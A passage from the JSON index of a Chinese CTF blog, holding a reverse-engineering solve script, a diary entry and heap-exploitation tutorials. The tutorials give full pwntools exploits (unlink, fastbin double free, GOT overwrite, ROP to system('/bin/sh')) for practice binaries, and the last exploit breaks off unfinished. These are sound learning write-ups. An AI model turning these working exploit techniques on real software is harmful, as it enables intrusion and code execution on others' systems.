&apos;)sh.send(&apos;y&apos;)comment(&apos;sir&apos;,19,&apos;a&apos;*0x50,&apos;b&apos;*2)sh.recvuntil(&apos;a&apos;*0x50)stack_addr = u32(sh.recv(4))- 0x28success(&quot;stack_addr = &quot; + hex(stack_addr))#gdb.attach(sh)sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)sh.send(&apos;y&apos;)for i in range(100): comment(&quot;sir&quot;,19,&apos;a&apos;*0x48,&apos;b&apos;*59) sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;) sh.send(&apos;y&apos;)print hex(stack_addr)#gdb.attach(sh)rea = p32(0)+p32(0x41)+&apos;A&apos;*56+p32(0)+p32(0x41)pay = &apos;c&apos;*80 + &apos;bbbb&apos; + p32(stack_addr)+p32(0)+p32(0x41)comment(&apos;sir&apos;,19,rea, pay)gdb.attach(sh)sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)sh.send(&apos;y&apos;)pay = &apos;bbbb&apos; +p32(libc.sym[&apos;system&apos;]) + &apos;bbbb&apos;+p32(libc.search(&apos;/bin/sh\\x00&apos;).next())comment(pay, 19, &apos;a&apos;*0x20, &apos;b&apos;*2)gdb.attach(sh)sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)sh.send(&apos;n&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Jarvis Oj-reverse","slug":"jarvis-oj-reverse","date":"2018-11-06T08:01:46.000Z","updated":"2018-11-06T10:10:01.193Z","comments":true,"path":"2018/11/06/jarvis-oj-reverse/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/","excerpt":"","text":"稍微学学逆向 FindKey 拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题） 将pyc还原成py文件 发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序） 直接上wp 1234567891011import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]flag = &quot; &quot;for i in range (0,17): flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )f = flag[::-1]print(f) 对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20181027","slug":"diary-20181027","date":"2018-10-27T02:42:19.000Z","updated":"2018-10-27T03:03:57.266Z","comments":true,"path":"2018/10/27/diary-20181027/","link":"","permalink":"http://siriuswhiter.tk/2018/10/27/diary-20181027/","excerpt":"","text":"或许真的是极尽苦难的一周。 也是一事无成的一周。 少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。 虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。 再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。 虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。 所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。 不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn2.2-fastbin_dup_consolidate","slug":"introduction-to-pwn2-2-fastbin-dup-consolidate","date":"2018-10-18T08:43:27.000Z","updated":"2019-01-26T04:31:01.176Z","comments":true,"path":"2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","link":"","permalink":"http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","excerpt":"","text":"比较神奇的一个利用。pwntools —&gt; cyclic cyclic_findi locals fastbin_dup_consolidate原理 当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。 继续使用how2heap的例子来理解。12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123; void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3); fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));&#125; 运行结果： 12345678./fastbin_dup_consolidate Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0Now free p1!Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300In malloc_consolidate(), p1 is moved to the unsorted bin.Trigger the double free vulnerability!We can pass the check in malloc() since p1 is not fast top.Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260 SleepyHolder简单程度和uaf相当hhhh 题目main 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax unsigned int buf; // [rsp+4h] [rbp-1Ch] int fd; // [rsp+8h] [rbp-18h] int v6; // [rsp+Ch] [rbp-14h] char s; // [rsp+10h] [rbp-10h] unsigned __int64 v8; // [rsp+18h] [rbp-8h] v8 = __readfsqword(0x28u); alarm0x3c(); // // puts(&quot;Waking Sleepy Holder up ...&quot;); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;buf, 4uLL); buf &amp;= 0xFFFu; malloc(buf); // malloc something random to change heap_address every time // sleep(3u); puts(&quot;Hey! Do you have any secret?&quot;); puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;); while ( 1 ) &#123; puts(&quot;1. Keep secret&quot;); puts(&quot;2. Wipe secret&quot;); puts(&quot;3. Renew secret&quot;); memset(&amp;s, 0, 4uLL); read(0, &amp;s, 4uLL); v3 = atoi(&amp;s); v6 = v3; switch ( v3 ) &#123; case 2: wipe_secret(); //仅仅把free掉并把该chunk的inuse位标记为0 break; case 3: renew_secret(); //重新改写1或者2的chunk，大小最大还是原来那么大。 break; case 1: keep_serect(); //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1. break; &#125; &#125;&#125; 思路假设三个chunk分别为chunk0,1,2; 首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1. 之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。 通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。 算出system的地址，并将其写入free_got，调用free便可以getshell。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]p = process(&apos;./SleepyHolder&apos;)elf = ELF(&apos;./SleepyHolder&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) //ldd ./SleepyHolderdef add(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content) def delete(index): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.send(str(index))def update(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content)#分配chunk1 chunk2add(1, &apos;a&apos;*0x10)add(2, &apos;b&apos;*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, &apos;c&apos;*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got[&apos;free&apos;]atoi_got = elf.got[&apos;atoi&apos;]puts_got = elf.got[&apos;puts&apos;]puts = elf.symbols[&apos;puts&apos;]system_off = libc.symbols[&apos;system&apos;]atoi_off = libc.symbols[&apos;atoi&apos;]#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + &apos;\\x00\\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节print &quot;libc_base : %#x&quot; % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, &apos;/bin/sh\\x00&apos;)delete(2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.1-fastbin_dup","slug":"introduction-to-pwn2-1-fastbin-dup","date":"2018-10-15T11:14:55.000Z","updated":"2019-02-19T06:14:51.320Z","comments":true,"path":"2018/10/15/introduction-to-pwn2-1-fastbin-dup/","link":"","permalink":"http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/","excerpt":"","text":"尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。 fastbin_dup原理利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。 可以用how2heap的例子来理解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\\n&quot; &quot;returning a pointer to a controlled location (in this case, the stack).\\n&quot;); unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot; &quot;We&apos;ll now carry out our attack by modifying data at %p.\\n&quot;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\\n&quot; &quot;return a pointer to it.\\n&quot;, a); stack_var = 0x20; fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\\n&quot;, malloc(8)); fprintf(stderr, &quot;4th malloc(8): %p\\n&quot;, malloc(8));&#125; 运行结果为： 1234567891011121314151617181920212223 ./fastbin_dup_into_stack This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7ffe1abfa870.Allocating 3 buffers.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e2803rd malloc(8): 0x56317e17e2a0Freeing the first one...If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.So, instead, we&apos;ll free 0x56317e17e280.Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e280Now the free list has [ 0x56317e17e260 ].Now, we have access to 0x56317e17e260 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.3rd malloc(8): 0x56317e17e260, putting the stack address on the free list4th malloc(8): 0x7ffe1abfa860 可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。 例题-9447-search-engine条件程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。 123456int menu()&#123; puts(&quot;1: Search with a word&quot;); puts(&quot;2: Index a sentence&quot;); return puts(&quot;3: Quit&quot;);&#125; inde a sentence.程序写的很复杂，看起来很揪心。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int index_a_sentence()&#123; int v0; // eax __int64 v1; // rbp int v2; // er13 char *v3; // r12 signed __int64 v4; // rbx signed __int64 v5; // rbp _DWORD *v6; // rax int v7; // edx __int64 v8; // rdx __int64 v10; // rdx puts(&quot;Enter the sentence size:&quot;); v0 = get_num(); v1 = (unsigned int)(v0 - 1); v2 = v0; if ( (unsigned int)v1 &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); v3 = (char *)malloc(v2); read_until_newline((__int64)v3, v2, 0); v4 = (signed __int64)(v3 + 1); v5 = (signed __int64)&amp;v3[v1 + 2]; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v3; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; do &#123; while ( *(_BYTE *)(v4 - 1) != 32 ) &#123; v6[2] = ++v7;LABEL_4: if ( ++v4 == v5 ) goto LABEL_8; &#125; if ( v7 ) &#123; v10 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v10; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v4; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; goto LABEL_4; &#125; *(_QWORD *)v6 = v4++; &#125; while ( v4 != v5 );LABEL_8: if ( v7 ) &#123; v8 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v8; &#125; else &#123; free(v6); &#125; return puts(&quot;Added sentence&quot;);&#125; search word： 123456789101112131415161718192021222324252627282930313233343536void search_with_a_word()&#123; int v0; // ebp void *v1; // r12 __int64 i; // rbx char v3; // [rsp+0h] [rbp-38h] puts(&quot;Enter the word size:&quot;); v0 = get_num(); if ( (unsigned int)(v0 - 1) &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the word:&quot;); v1 = malloc(v0); read_until_newline((__int64)v1, v0, 0); for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) ) &#123; if ( **(_BYTE **)(i + 16) ) &#123; if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24)); fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_until_newline((__int64)&amp;v3, 2, 1); if ( v3 == 121 ) &#123; memset(*(void **)(i + 16), 0, *(signed int *)(i + 24)); free(*(void **)(i + 16)); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; &#125; free(v1);&#125; get_num： 123456789101112131415161718__int64 get_num()&#123; __int64 result; // rax char *endptr; // [rsp+8h] [rbp-50h] char nptr; // [rsp+10h] [rbp-48h] unsigned __int64 v3; // [rsp+48h] [rbp-10h] v3 = __readfsqword(0x28u); read_until_newline((__int64)&amp;nptr, 48, 1); result = strtol(&amp;nptr, &amp;endptr, 0); if ( endptr == &amp;nptr ) &#123; __printf_chk(1LL, &quot;%s is not a valid number\\n&quot;, &amp;nptr); result = get_num(); &#125; __readfsqword(0x28u); return result;&#125; 分析get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。 整个过程大概是以一个结构体来保存每个单词：(40个字节) 12345678struct words_struct &#123; addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) int64_t size; // 单词大小 addr* ptr_to_sentences; //单词所在的句子字符串的位置 int64_t* size_of_sentences;//句子长度 words_struct* next_word;//链表下一个节点指针 &#125;; 在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \\x00 ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 \\x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 \\x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 memset 的时候，单词虽然都变为了 \\x00 ，但是我们仍然可以通过两个 \\x00 的比较来绕过 memcmp 的检测。 利用思路1) 利用get_num函数的漏洞试图泄露栈地址2) 泄露libc_address，从而计算出system 和 /bin/sh的地址3) 利用fastbin_dup 进行double free4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”) 思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样 exp先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#!/usr/bin/env python2from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)# binsh_offset 找不到pop_rdi_ret = 0x400e23system_offset = 0x46590puts_offset = 0x6fd60binsh_offset = 1558723def leak_stack(): p.sendline(&apos;A&apos;*48) p.recvuntil(&apos;Quit\\n&apos;) p.recvline() # doesn&apos;t work all the time p.sendline(&apos;A&apos;*48) leak = p.recvline().split(&apos; &apos;)[0][48:] return int(leak[::-1].encode(&apos;hex&apos;), 16)def leak_libc(): # this sentence is the same size as a list node index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;)) # delete the sentence search(&apos;a&apos; * 12) p.sendline(&apos;y&apos;) # the node for this sentence gets put in the previous sentence&apos;s spot. # note we made sure this doesn&apos;t reuse the chunk that was just freed by # making it 64 bytes index_sentence(&apos;d&apos; * 64) # free the first sentence again so we can allocate something on top of it. # this will work because 1) the sentence no longer starts with a null byte # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2) # the location where our original string contained `b` is guaranteed to be # zero. this is because after the original sentence was zeroed out, nothing # was allocated at offset 12, which is just padding in the structure. if # we had made the first word in the string 16 bytes instead of 12, then that # would put &apos;b&apos; at a location where it would not be guaranteed to be zero. search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) # make our fake node node = &apos;&apos; node += p64(0x400E90) # word pointer &quot;Enter&quot; node += p64(5) # word length node += p64(0x602028) # sentence pointer (GOT address of free) node += p64(64) # length of sentence node += p64(0x00000000) # next pointer is null assert len(node) == 40 # this sentence gets allocated on top of the previous sentence&apos;s node. # we can thus control the sentence pointer of that node and leak memory. index_sentence(node) # this simply receives all input from the binary and discards it, which # makes parsing out the leaked address easier below. p.clean() # leak the libc address search(&apos;Enter&apos;) p.recvuntil(&apos;Found 64: &apos;) leak = u64(p.recvline()[:8]) p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary return leakdef index_sentence(s): p.sendline(&apos;2&apos;) p.sendline(str(len(s))) p.sendline(s)def search(s): p.sendline(&apos;1&apos;) p.sendline(str(len(s))) p.sendline(s)def make_cycle(): index_sentence(&apos;a&apos;*54 + &apos; d&apos;) index_sentence(&apos;b&apos;*54 + &apos; d&apos;) index_sentence(&apos;c&apos;*54 + &apos; d&apos;) search(&apos;d&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;n&apos;)def make_fake_chunk(addr): # set the fwd pointer of the chunk to the address we want fake_chunk = p64(addr) index_sentence(fake_chunk.ljust(56))def allocate_fake_chunk(binsh_addr, system_addr): # allocate twice to get our fake chunk index_sentence(&apos;A&apos;*56) index_sentence(&apos;B&apos;*56) # overwrite the return address buf = &apos;A&apos;*30 buf += p64(pop_rdi_ret) buf += p64(binsh_addr) buf += p64(system_addr) buf = buf.ljust(56, &apos;C&apos;) index_sentence(buf)def main(): stack_leak = leak_stack() # This makes stack_addr + 0x8 be 0x40 //在泄露的栈地址附近寻找0x40用于充当fakechunk的size stack_addr = stack_leak + 0x5a - 8 log.info(&apos;stack leak: %s&apos; % hex(stack_leak)) log.info(&apos;stack addr: %s&apos; % hex(stack_addr)) libc_leak = leak_libc() libc_base = libc_leak - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset log.info(&apos;libc leak: %s&apos; % hex(libc_leak)) log.info(&apos;libc_base: %s&apos; % hex(libc_base)) log.info(&apos;system addr: %s&apos; % hex(system_addr)) log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr)) make_cycle() make_fake_chunk(stack_addr) allocate_fake_chunk(binsh_addr, system_addr) p.interactive()if __name__ == &apos;__main__&apos;: main() 例题-0ctfbabyheap条件炒鸡正规的条件选项题： 12345678./0ctfbabyheap ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 分配的块可以分析出有一个结构体： 12345 struc_4 structure&#123; 00000000 inuse 00000001 size 00000002 ptr 00000003 &#125;struc_4 ends inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址； 各个选项就不一一列举了，每个选项就如它名字一般：allocate使用calloc分配块，最大4096；fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。 分析即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。 目标：1.leak libc地址 2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell） 1234567891011gdb-peda$ x/20gx (long long)(&amp;main_arena)-0x300x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;: 0x00007fa3a2004d60 0x00000000000000000x7fa3a2008c20 &lt;__memalign_hook&gt;: 0x00007fa3a1ed4bf0 0x00007fa3a1ed51600x7fa3a2008c30 &lt;__malloc_hook&gt;: 0x0000000000000000 0x0000000000000000 &lt;-- malloc hook 0x7fa3a2008c40 &lt;main_arena&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008ca0 &lt;main_arena+96&gt;: 0x000055b863881360 0x0000000000000000 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./0ctfbabyheap&apos;)ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;def allocate(size): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;1&quot;) sh.recvuntil(&apos;Size: &apos;) sh.sendline(str(size))def fill(index,content): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;2&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index)) sh.recvuntil(&apos;Size: &apos;) sh.sendline(str(len(content))) sh.recvuntil(&apos;Content: &apos;) sh.sendline(content)def free(index): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;3&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index))def dump(index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index))#--------- allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x80)#----------leak libc 